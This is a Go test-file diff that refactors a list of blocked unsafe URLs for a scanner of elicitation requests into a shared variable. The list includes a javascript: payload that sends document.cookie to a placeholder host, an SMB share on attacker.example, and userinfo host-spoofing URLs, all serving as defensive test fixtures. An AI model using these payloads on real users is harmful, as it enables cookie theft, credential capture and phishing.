@@ -110,10 +110,9 @@ func TestElicitationURL_InstallDeeplinkInRenderedText(t *testing.T) {
 	}
 }
 
-// TestElicitationURL_UnsafeTargetsBlock: targets that execute, reach the local
-// machine or a share, or spoof the host with userinfo. All enumerable.
-func TestElicitationURL_UnsafeTargetsBlock(t *testing.T) {
-	cases := []string{
+// elicitationUnsafeTargetURLs is every BLOCK-tier unsafe-target URL the scanner
+// is pinned against; the monotonicity invariant (#4204) is generated from it.
+var elicitationUnsafeTargetURLs = []string{
 		"javascript:fetch('https://c.example/?k='+document.cookie)",
 		"JavaScript:void(0)",
 		"java\tscript:void(0)",
@@ -125,7 +124,12 @@ func TestElicitationURL_UnsafeTargetsBlock(t *testing.T) {
 		"smb://attacker.example/share",
 		"https://github.com@auth-github.example/login/oauth/authorize",
 		"https://user:hunter2@auth.example.com/connect",
-	}
+}
+
+// TestElicitationURL_UnsafeTargetsBlock: targets that execute, reach the local
+// machine or a share, or spoof the host with userinfo. All enumerable.
+func TestElicitationURL_UnsafeTargetsBlock(t *testing.T) {
+	cases := elicitationUnsafeTargetURLs
 	for _, u := range cases {
 		r := ScanElicitationCreate(urlElicitation(u))
 		if !r.Blocked || len(findingsBySignal(r, SignalElicitationURLUnsafeTarget)) == 0 {
